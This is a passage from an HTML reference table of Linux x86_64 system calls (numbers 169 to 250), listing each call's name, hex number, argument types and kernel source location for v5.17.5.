href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/swapfile.c#L2381">mm&#x2F;swapfile.c:2381</a></td></tr><tr><td>169</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/reboot.2.html">sys_reboot</a></td><td>0xa9</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void __user *arg</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/reboot.c#L700">kernel&#x2F;reboot.c:700</a></td></tr><tr><td>170</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sethostname.2.html">sys_sethostname</a></td><td>0xaa</td><td>char __user *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1356">kernel&#x2F;sys.c:1356</a></td></tr><tr><td>171</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setdomainname.2.html">sys_setdomainname</a></td><td>0xab</td><td>char __user *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1410">kernel&#x2F;sys.c:1410</a></td></tr><tr><td>172</td><td></td><td></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>173</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioperm.2.html">sys_ioperm</a></td><td>0xad</td><td>unsigned long from</td><td>unsigned long num</td><td>int on</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/arch/x86/kernel/ioport.c#L152">arch&#x2F;x86&#x2F;kernel&#x2F;ioport.c:152</a></td></tr><tr><td>174</td><td>not implemented</td><td>0xae</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>175</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/init_module.2.html">sys_init_module</a></td><td>0xaf</td><td>void __user *umod</td><td>unsigned long len</td><td>const char __user *uargs</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/module/main.c#L2896">kernel&#x2F;module&#x2F;main.c:2896</a></td></tr><tr><td>176</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/delete_module.2.html">sys_delete_module</a></td><td>0xb0</td><td>const char __user *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/module/main.c#L696">kernel&#x2F;module&#x2F;main.c:696</a></td></tr><tr><td>177</td><td>not implemented</td><td>0xb1</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>178</td><td>not implemented</td><td>0xb2</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>179</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/quotactl.2.html">sys_quotactl</a></td><td>0xb3</td><td>unsigned int cmd</td><td>const char __user *special</td><td>qid_t id</td><td>void __user *addr</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/quota/quota.c#L916">fs&#x2F;quota&#x2F;quota.c:916</a></td></tr><tr><td>180</td><td>not implemented</td><td>0xb4</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>181</td><td>not implemented</td><td>0xb5</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>182</td><td>not implemented</td><td>0xb6</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>183</td><td>not implemented</td><td>0xb7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>184</td><td>not implemented</td><td>0xb8</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>185</td><td>not implemented</td><td>0xb9</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>186</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettid.2.html">sys_gettid</a></td><td>0xba</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>187</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readahead.2.html">sys_readahead</a></td><td>0xbb</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/readahead.c#L761">mm&#x2F;readahead.c:761</a></td></tr><tr><td>188</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setxattr.2.html">sys_setxattr</a></td><td>0xbc</td><td>const char __user *path</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L648">fs&#x2F;xattr.c:648</a></td></tr><tr><td>189</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lsetxattr.2.html">sys_lsetxattr</a></td><td>0xbd</td><td>const char __user *path</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L655">fs&#x2F;xattr.c:655</a></td></tr><tr><td>190</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsetxattr.2.html">sys_fsetxattr</a></td><td>0xbe</td><td>int fd</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L662">fs&#x2F;xattr.c:662</a></td></tr><tr><td>191</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getxattr.2.html">sys_getxattr</a></td><td>0xbf</td><td>const char __user *path</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L760">fs&#x2F;xattr.c:760</a></td></tr><tr><td>192</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lgetxattr.2.html">sys_lgetxattr</a></td><td>0xc0</td><td>const char __user *path</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L766">fs&#x2F;xattr.c:766</a></td></tr><tr><td>193</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fgetxattr.2.html">sys_fgetxattr</a></td><td>0xc1</td><td>int fd</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L772">fs&#x2F;xattr.c:772</a></td></tr><tr><td>194</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/listxattr.2.html">sys_listxattr</a></td><td>0xc2</td><td>const char __user *path</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L837">fs&#x2F;xattr.c:837</a></td></tr><tr><td>195</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/llistxattr.2.html">sys_llistxattr</a></td><td>0xc3</td><td>const char __user *path</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L843">fs&#x2F;xattr.c:843</a></td></tr><tr><td>196</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flistxattr.2.html">sys_flistxattr</a></td><td>0xc4</td><td>int fd</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L849">fs&#x2F;xattr.c:849</a></td></tr><tr><td>197</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/removexattr.2.html">sys_removexattr</a></td><td>0xc5</td><td>const char __user *path</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L903">fs&#x2F;xattr.c:903</a></td></tr><tr><td>198</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lremovexattr.2.html">sys_lremovexattr</a></td><td>0xc6</td><td>const char __user *path</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L909">fs&#x2F;xattr.c:909</a></td></tr><tr><td>199</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fremovexattr.2.html">sys_fremovexattr</a></td><td>0xc7</td><td>int fd</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L915">fs&#x2F;xattr.c:915</a></td></tr><tr><td>200</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tkill.2.html">sys_tkill</a></td><td>0xc8</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3968">kernel&#x2F;signal.c:3968</a></td></tr><tr><td>201</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/time.2.html">sys_time</a></td><td>0xc9</td><td>__kernel_old_time_t __user *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1005">kernel&#x2F;sys.c:1005</a></td></tr><tr><td>202</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futex.2.html">sys_futex</a></td><td>0xca</td><td>u32 __user *uaddr</td><td>int op</td><td>u32 val</td><td>const struct __kernel_timespec __user *utime</td><td>u32 __user *uaddr2</td><td>u32 val3</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/futex/syscalls.c#L164">kernel&#x2F;futex&#x2F;syscalls.c:164</a></td></tr><tr><td>203</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setaffinity.2.html">sys_sched_setaffinity</a></td><td>0xcb</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long __user *user_mask_ptr</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8211">kernel&#x2F;sched&#x2F;core.c:8211</a></td></tr><tr><td>204</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getaffinity.2.html">sys_sched_getaffinity</a></td><td>0xcc</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long __user *user_mask_ptr</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8263">kernel&#x2F;sched&#x2F;core.c:8263</a></td></tr><tr><td>205</td><td>not implemented</td><td>0xcd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>206</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_setup.2.html">sys_io_setup</a></td><td>0xce</td><td>unsigned nr_reqs</td><td>aio_context_t __user *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L1335">fs&#x2F;aio.c:1335</a></td></tr><tr><td>207</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_destroy.2.html">sys_io_destroy</a></td><td>0xcf</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L1404">fs&#x2F;aio.c:1404</a></td></tr><tr><td>208</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_getevents.2.html">sys_io_getevents</a></td><td>0xd0</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event __user *events</td><td>struct __kernel_timespec __user *timeout</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L2218">fs&#x2F;aio.c:2218</a></td></tr><tr><td>209</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_submit.2.html">sys_io_submit</a></td><td>0xd1</td><td>aio_context_t</td><td>long</td><td>struct iocb __user * __user *</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L2048">fs&#x2F;aio.c:2048</a></td></tr><tr><td>210</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_cancel.2.html">sys_io_cancel</a></td><td>0xd2</td><td>aio_context_t ctx_id</td><td>struct iocb __user *iocb</td><td>struct io_event __user *result</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L2142">fs&#x2F;aio.c:2142</a></td></tr><tr><td>211</td><td>not implemented</td><td>0xd3</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>212</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lookup_dcookie.2.html">sys_lookup_dcookie</a></td><td>0xd4</td><td>u64 cookie64</td><td>char __user *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>213</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create.2.html">sys_epoll_create</a></td><td>0xd5</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2037">fs&#x2F;eventpoll.c:2037</a></td></tr><tr><td>214</td><td>not implemented</td><td>0xd6</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>215</td><td>not implemented</td><td>0xd7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>216</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/remap_file_pages.2.html">sys_remap_file_pages</a></td><td>0xd8</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mmap.c#L2807">mm&#x2F;mmap.c:2807</a></td></tr><tr><td>217</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents64.2.html">sys_getdents64</a></td><td>0xd9</td><td>unsigned int fd</td><td>struct linux_dirent64 __user *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/readdir.c#L354">fs&#x2F;readdir.c:354</a></td></tr><tr><td>218</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_tid_address.2.html">sys_set_tid_address</a></td><td>0xda</td><td>int __user *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/fork.c#L1769">kernel&#x2F;fork.c:1769</a></td></tr><tr><td>219</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/restart_syscall.2.html">sys_restart_syscall</a></td><td>0xdb</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>220</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/semtimedop.2.html">sys_semtimedop</a></td><td>0xdc</td><td>int semid</td><td>struct sembuf __user *sops</td><td>unsigned nsops</td><td>const struct __kernel_timespec __user *timeout</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/sem.c#L2270">ipc&#x2F;sem.c:2270</a></td></tr><tr><td>221</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fadvise64.2.html">sys_fadvise64</a></td><td>0xdd</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/fadvise.c#L212">mm&#x2F;fadvise.c:212</a></td></tr><tr><td>222</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_create.2.html">sys_timer_create</a></td><td>0xde</td><td>clockid_t which_clock</td><td>struct sigevent __user *timer_event_spec</td><td>timer_t __user * created_timer_id</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L577">kernel&#x2F;time&#x2F;posix-timers.c:577</a></td></tr><tr><td>223</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_settime.2.html">sys_timer_settime</a></td><td>0xdf</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec __user *new_setting</td><td>struct __kernel_itimerspec __user *old_setting</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L938">kernel&#x2F;time&#x2F;posix-timers.c:938</a></td></tr><tr><td>224</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_gettime.2.html">sys_timer_gettime</a></td><td>0xe0</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec __user *setting</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L738">kernel&#x2F;time&#x2F;posix-timers.c:738</a></td></tr><tr><td>225</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_getoverrun.2.html">sys_timer_getoverrun</a></td><td>0xe1</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L777">kernel&#x2F;time&#x2F;posix-timers.c:777</a></td></tr><tr><td>226</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_delete.2.html">sys_timer_delete</a></td><td>0xe2</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L1004">kernel&#x2F;time&#x2F;posix-timers.c:1004</a></td></tr><tr><td>227</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_settime.2.html">sys_clock_settime</a></td><td>0xe3</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec __user *tp</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-stubs.c#L60">kernel&#x2F;time&#x2F;posix-stubs.c:60</a></td></tr><tr><td>228</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_gettime.2.html">sys_clock_gettime</a></td><td>0xe4</td><td>clockid_t which_clock</td><td>struct __kernel_timespec __user *tp</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-stubs.c#L94">kernel&#x2F;time&#x2F;posix-stubs.c:94</a></td></tr><tr><td>229</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_getres.2.html">sys_clock_getres</a></td><td>0xe5</td><td>clockid_t which_clock</td><td>struct __kernel_timespec __user *tp</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-stubs.c#L109">kernel&#x2F;time&#x2F;posix-stubs.c:109</a></td></tr><tr><td>230</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_nanosleep.2.html">sys_clock_nanosleep</a></td><td>0xe6</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec __user *rqtp</td><td>struct __kernel_timespec __user *rmtp</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-stubs.c#L128">kernel&#x2F;time&#x2F;posix-stubs.c:128</a></td></tr><tr><td>231</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit_group.2.html">sys_exit_group</a></td><td>0xe7</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/exit.c#L959">kernel&#x2F;exit.c:959</a></td></tr><tr><td>232</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_wait.2.html">sys_epoll_wait</a></td><td>0xe8</td><td>int epfd</td><td>struct epoll_event __user *events</td><td>int maxevents</td><td>int timeout</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2265">fs&#x2F;eventpoll.c:2265</a></td></tr><tr><td>233</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_ctl.2.html">sys_epoll_ctl</a></td><td>0xe9</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event __user *event</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2207">fs&#x2F;eventpoll.c:2207</a></td></tr><tr><td>234</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tgkill.2.html">sys_tgkill</a></td><td>0xea</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3952">kernel&#x2F;signal.c:3952</a></td></tr><tr><td>235</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimes.2.html">sys_utimes</a></td><td>0xeb</td><td>char __user *filename</td><td>struct __kernel_old_timeval __user *utimes</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/utimes.c#L208">fs&#x2F;utimes.c:208</a></td></tr><tr><td>236</td><td>not implemented</td><td>0xec</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>237</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mbind.2.html">sys_mbind</a></td><td>0xed</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mempolicy.c#L1558">mm&#x2F;mempolicy.c:1558</a></td></tr><tr><td>238</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_mempolicy.2.html">sys_set_mempolicy</a></td><td>0xee</td><td>int mode</td><td>const unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mempolicy.c#L1585">mm&#x2F;mempolicy.c:1585</a></td></tr><tr><td>239</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_mempolicy.2.html">sys_get_mempolicy</a></td><td>0xef</td><td>int __user *policy</td><td>unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mempolicy.c#L1717">mm&#x2F;mempolicy.c:1717</a></td></tr><tr><td>240</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_open.2.html">sys_mq_open</a></td><td>0xf0</td><td>const char __user *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr __user *attr</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L942">ipc&#x2F;mqueue.c:942</a></td></tr><tr><td>241</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_unlink.2.html">sys_mq_unlink</a></td><td>0xf1</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L952">ipc&#x2F;mqueue.c:952</a></td></tr><tr><td>242</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedsend.2.html">sys_mq_timedsend</a></td><td>0xf2</td><td>mqd_t mqdes</td><td>const char __user *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec __user *abs_timeout</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L1284">ipc&#x2F;mqueue.c:1284</a></td></tr><tr><td>243</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedreceive.2.html">sys_mq_timedreceive</a></td><td>0xf3</td><td>mqd_t mqdes</td><td>char __user *msg_ptr</td><td>size_t msg_len</td><td>unsigned int __user *msg_prio</td><td>const struct __kernel_timespec __user *abs_timeout</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L1298">ipc&#x2F;mqueue.c:1298</a></td></tr><tr><td>244</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_notify.2.html">sys_mq_notify</a></td><td>0xf4</td><td>mqd_t mqdes</td><td>const struct sigevent __user *notification</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L1440">ipc&#x2F;mqueue.c:1440</a></td></tr><tr><td>245</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_getsetattr.2.html">sys_mq_getsetattr</a></td><td>0xf5</td><td>mqd_t mqdes</td><td>const struct mq_attr __user *mqstat</td><td>struct mq_attr __user *omqstat</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/mqueue.c#L1496">ipc&#x2F;mqueue.c:1496</a></td></tr><tr><td>246</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kexec_load.2.html">sys_kexec_load</a></td><td>0xf6</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment __user *segments</td><td>unsigned long flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/kexec.c#L228">kernel&#x2F;kexec.c:228</a></td></tr><tr><td>247</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitid.2.html">sys_waitid</a></td><td>0xf7</td><td>int which</td><td>pid_t pid</td><td>struct siginfo __user *infop</td><td>int options</td><td>struct rusage __user *ru</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/exit.c#L1638">kernel&#x2F;exit.c:1638</a></td></tr><tr><td>248</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/add_key.2.html">sys_add_key</a></td><td>0xf8</td><td>const char __user *_type</td><td>const char __user *_description</td><td>const void __user *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/keys/keyctl.c#L74">security&#x2F;keys&#x2F;keyctl.c:74</a></td></tr><tr><td>249</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/request_key.2.html">sys_request_key</a></td><td>0xf9</td><td>const char __user *_type</td><td>const char __user *_description</td><td>const char __user *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/keys/keyctl.c#L167">security&#x2F;keys&#x2F;keyctl.c:167</a></td></tr><tr><td>250</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/keyctl.2.html">sys_keyctl</a></td><td>0xfa</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/keys/keyctl.c#L1869">security&#x2F;keys&#x2F;keyctl.c:1869</a></td></tr><tr><td>251</td><td><a 